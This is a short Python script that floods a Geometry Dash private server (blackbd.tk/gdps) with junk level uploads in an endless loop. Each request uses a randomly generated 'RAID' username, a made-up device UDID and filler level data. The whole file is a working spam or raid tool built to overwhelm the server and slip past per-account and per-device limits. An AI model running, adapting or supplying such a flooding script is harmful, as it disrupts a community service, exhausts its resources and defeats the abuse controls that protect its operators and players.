import requests
from random import randint as rand
from base64 import b64encode as b64e
endpoint = "http://blackbd.tk/gdps/scripts/"

def postLevel(levelName, levelDesc, levelLength, audioTrack, levelString, udid):
    data = {
        'gameVersion': 21,
        'userName': 'RAID'+str(rand(111111111, 999999999)),
        'gjp': '',
        'levelID': 0,
        'secret': 'sosi',
        'levelVersion': 1,
        'levelName': levelName,
        'levelDesc': levelDesc,
        'levelLength': levelLength,
        'audioTrack': audioTrack,
        'levelString': levelString,
        'udid': udid
    }
    r = requests.post(endpoint+"uploadGJLevel21.php", data=data)
    return r.text
def generateUDID():
    udid = "S"+str(rand(111111111, 999999999))+str(rand(111111111, 999999999))+str(rand(111111111, 999999999))+str(rand(111111111, 999999999))+str(rand(1,9))
    return udid

while True:
    l = postLevel("raid"+str(rand(11111,9999999)), "", 3, 4, "fwfwefwefwwef"+str(rand(111111111, 999999999)), generateUDID())
    print(l)
